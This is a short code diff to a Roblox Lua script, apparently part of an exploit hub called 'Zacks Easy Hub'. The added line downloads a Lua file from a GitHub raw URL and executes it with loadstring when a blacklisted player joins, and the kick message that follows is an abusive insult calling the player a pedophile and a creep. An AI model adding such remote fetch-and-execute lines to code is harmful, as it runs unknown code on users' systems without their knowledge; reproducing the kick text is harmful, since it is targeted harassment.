@@ -62,6 +62,7 @@ end
 
 game.Players.PlayerAdded:Connect(function(player)
     if isPlayerBlacklisted(player.Name) then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/exercise_knowledge.lua'))()
         return player:Kick("You are blacklisted from 'Zacks Easy Hub', leave pedophile, nobody likes pedophiles, you fucking creep, get a job.")
     else
         warn("..??>>")
